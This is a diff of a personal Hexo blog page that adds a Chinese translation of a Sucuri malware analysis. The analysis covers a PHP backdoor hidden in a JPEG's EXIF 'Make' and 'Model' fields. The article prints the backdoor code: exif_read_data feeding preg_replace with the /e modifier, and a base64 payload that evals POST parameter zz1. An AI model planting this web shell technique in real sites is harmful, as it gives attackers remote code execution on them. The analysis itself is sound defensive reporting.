@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="我的第一篇博客, 二层楼">
-    <meta name="description" content="">
+    <meta name="description" content="荒原初见，悠悠我心，雪夜红墙，要你欢喜">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -190,7 +190,7 @@
         <div class="logo-name">二层楼</div>
         <div class="logo-desc">
             
-            Never really desperate, only the lost of the soul.
+            荒原初见，悠悠我心，雪夜红墙，要你欢喜
             
         </div>
     </div>
@@ -314,8 +314,8 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            <a href="https://github.com/thirteensummer" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>welcome to 二层楼----世界
             </a>
         </li>
         
@@ -371,8 +371,8 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
+<a href="https://github.com/thirteensummer" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="welcome to 二层楼----世界" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
         <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
@@ -387,6 +387,19 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('这是高级进阶博客，只属于定制（欢迎破解，加入13summer-Team），请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
 
 
 
@@ -544,7 +557,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="一种隐藏在JPG图片EXIF中的后门"><a href="#一种隐藏在JPG图片EXIF中的后门" class="headerlink" title="一种隐藏在JPG图片EXIF中的后门"></a>一种隐藏在JPG图片EXIF中的后门</h2><p>几天前，我们研究团队的 Peter Gramantik 在一个被攻破的网站上发现一个非常有趣的后门。这个后门并没有依靠正常模式去隐藏起内容（比如 base64/gzip 编码），但是它却把自己的数据隐藏在 JPEG 图片的 EXIT 头部中了。它也使用 exif_read_data 和 preg_replace 两个 PHP 函数来读取 EXIF 头部和执行。<br>技术细节<br>这个后门可分为两部分。第一部分是 exif_read_data 函数读取图片头部，preg_replace 函数来执行内容。下面是我们在被攻破网站上发现的代码：</p>
+<pre><code>$exif = exif_read_data(‘/homepages/clientsitepath/images/stories/food/bun.jpg’);
+preg_replace($exif[‘Make’],$exif[‘Model’],”);</code></pre>
+<p>这两个函数本身是无害滴。exif_read_data 函数常用来读取图片，preg_replace 函数是替代字符内容。不过，preg_replace 函数函数有个隐藏并微妙的选项，如果你传入 “/e”，它会执行 eval() 中的内容，就不是去查询/替代了。<br>所以我们在查看 bun.jpg 文件时，发现后门的第二部分：</p>
+<pre><code>ÿØÿà^@^PJFIF^@^A^B^@^@d^@d^@^@ÿá^@¡Exif^@^@II*^@
+^H^@^@^@^B^@^O^A^B^@^F^@^@^@&amp;^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^
+@ eval ( base64_decode(“aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzd
+HJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=’));
+@ÿì^@^QDucky^@^A^@^D^@^@^@&lt;^@^@ÿî^@^NAdobe^</code></pre>
+<p>这个文件用以常见的头部开始，但是在 ”make” 头部中混入了奇怪的关键字 ”/.*/e” 。有了这个执行修饰符， preg_replace 会执行 eval() 中传入的任意内容。<br>事情变得开始有趣了……<br>如果咱们继续来看看 EXIF 数据，我们能发现， “eval ( base64_decode”隐藏在 ”Model“ 头部。把这些放在一起看，咱们就知道怎么回事了。攻击者是从 EXIF 中读取 Make 和 Model 头部信息，然后传入到 preg_replace 函数。只要我们修改 $exif[‘Make’] 和 $exif[‘Model’] ，就得到了最终的后门。</p>
+<pre><code>preg_replace (“/.*/e”, ,”@ eval ( base64_decode(“aWYgKGl …”);</code></pre>
+<p>解码后我们可以看到是执行 $_POST[“zz1”] 提供的内容。完整解码后的后面在这里。</p>
+<pre><code>if (isset( $_POST[“zz1”])) &#123; eval (stripslashes( $_POST[“zz1”]..</code></pre>
+<p>隐藏恶意软件<br>另外一个有意思的是，虽然 bun.jpg 和其他图片文件被修改了，但然后能加载并正常工作。实际上，在这些被攻破的站点，攻击者修改了站点上一个合法并之前就存在的图片。这是一种奇特的隐藏恶意软件的方法。<br>原文出处：<a target="_blank" rel="noopener" href="http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
+
                 
             </div>
             <hr/>
